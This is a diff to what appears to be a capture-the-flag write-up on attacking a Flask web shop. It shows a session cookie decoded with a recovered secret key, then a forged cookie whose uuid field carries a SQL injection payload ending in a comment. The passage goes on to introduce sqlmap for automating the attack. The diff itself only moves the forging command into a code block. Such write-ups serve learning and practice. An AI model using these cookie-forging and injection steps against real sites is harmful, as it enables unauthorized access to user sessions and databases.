@@ -59,7 +59,11 @@ flask-unsign --decode -c '<cookie>' --secret 'Sup3rUnpredictableK3yPleas3Leav3md
 {'cart_items': [], 'uuid': '19bb7b62-a29f-4aa4-98de-7381da6c02d5'}
 ````
 
-Remember how we thought that the website used a database to match our UUID with a username? We can now test for SQL inject now that we have direct access to our UUID. Run the command `flask-unsign --sign -c "{'cart_items': [], 'uuid': '<your uuid from decoding cookie here>\'-- a'}" --secret Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942`. What we are doing with this is essentially just commenting the rest of the MySql query once our UUID is passed in. Once we create that cookie, replace our current cookie with it, and refresh the home page. We are still logged in. So we can confirm there is some SQL injection occuring here. 
+Remember how we thought that the website used a database to match our UUID with a username? We can now test for SQL inject now that we have direct access to our UUID. Run this command 
+```
+flask-unsign --sign -c "{'cart_items': [], 'uuid': '<your uuid from decoding cookie here>\'-- a'}" --secret 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942'
+```
+What we are doing with this is essentially just commenting the rest of the MySql query once our UUID is passed in. Once we create that cookie, replace our current cookie with it, and refresh the home page. We are still logged in. So we can confirm there is some SQL injection occuring here. 
 <br>
 <br>
 We can use this vulnerability to its fullest extent with the tool `sqlmap`, a tool that automates Sql injection. Run this command 
